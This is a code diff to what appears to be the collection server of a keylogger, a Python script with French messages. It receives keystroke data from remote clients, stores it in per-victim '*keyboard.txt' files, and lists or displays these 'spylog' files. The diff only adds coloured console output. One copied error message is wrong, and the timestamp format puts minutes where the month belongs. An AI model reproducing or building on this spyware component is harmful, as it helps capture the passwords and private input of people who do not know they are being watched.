@@ -7,7 +7,10 @@ import signal
 import argparse
 from datetime import datetime
 import os
+import colorama
+from colorama import Fore, Style
 
+colorama.init()
 def handle_co():
     global running_thrd, client_sockets
     while running_thrd:
@@ -36,14 +39,15 @@ def stop_server():
             client.close()
             print("Shutdown signal envoyé")
         except Exception as e:
-            print(f"Erreur lors de l'envoi de la fermeture au client : {e}")
+            print(Fore.RED + "Erreur lors de l'envoi de la fermeture au client : " + str(e) + Style.RESET_ALL)
 
     if server is not None:
         try:
             server.close()
             print("Le serveur a été fermé")
         except Exception as e:
-            print(f"Erreur lors de la fermeture du serveur : {e}")
+            print(Fore.RED + "Erreur lors de l'envoi de la fermeture au client : " + str(e) + Style.RESET_ALL)
+
     if thrd_co is not None:
         thrd_co.join()
 
@@ -59,10 +63,10 @@ def signal_handler(signal,frame):
 def list_spylog_files():
     files = glob.glob("*keyboard.txt")
     if not files:
-        print("Aucun fichier de log trouvé")
+        print(Fore.LIGHTMAGENTA_EX+"Aucun fichier trouvé\n"+Style.RESET_ALL)
         return
     for file in files:
-        print(f"{file}\n")
+        print(f"{Fore.LIGHTMAGENTA_EX}{file}{Style.RESET_ALL}")
 
 def read_spylog_file(filename):
     try:
@@ -75,7 +79,7 @@ def read_spylog_file(filename):
 
 def listen_port(port):
     global server
-    print(f"Listening on port {port}...")
+    print(Fore.YELLOW + "Listening on port " + str(port) + "..." + Style.RESET_ALL)
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind(('localhost',port)) # localhost
@@ -89,7 +93,7 @@ def recv_file_from_klg(client_sock, addr):
         while running_thrd:
             _ = client_sock.recv(bufer_size).decode().strip()
             if not _:
-                print("Aucune donée reçu fin de la connexion")
+                print(Fore.RED + "Aucune donnée reçue, fin de la connexion" + Style.RESET_ALL)
                 return
             # Generation du nom de fichier unique
             timestamp = datetime.now().strftime("%Y%M%d_%H%M%S")
@@ -97,7 +101,7 @@ def recv_file_from_klg(client_sock, addr):
             unique_filename = f"{ip_client}_{timestamp}-keyboard.txt"
 
             with open(unique_filename, "wb") as f:
-                print(f"Début de reception du fichier {unique_filename}")
+                print(Fore.GREEN + "Début de réception du fichier " + unique_filename + Style.RESET_ALL)
                 while running_thrd:
                     data = client_sock.recv(bufer_size)
                     if not data or b"<END>" in data:
@@ -105,7 +109,7 @@ def recv_file_from_klg(client_sock, addr):
                         break
                     f.write(data)
                 client_sock.sendall(b"ACK")
-                print(f"Fin de reception du fichier {unique_filename}")
+                print(Fore.CYAN + "Fichier " + unique_filename + " reçu avec succès" + Style.RESET_ALL)
     except KeyboardInterrupt as e:
         print(f"CTRL + C détecté: {e}")
         client_sock.close()
@@ -127,9 +131,9 @@ if __name__ == '__main__':
     if args.kill:
         if os.path.exists("server.lock"):
             stop_server()
-            print("Le serveur a été fermé")
+            print(Fore.GREEN + "Le serveur a été fermé" + Style.RESET_ALL)
         else:
-            print("Le serveur n'est pas en cours d'exécution")
+            print(Fore.RED + "Le serveur n'est pas en cours d'exécution" + Style.RESET_ALL)
         sys.exit(0)  # Sortir du script ici
 
     if args.show:
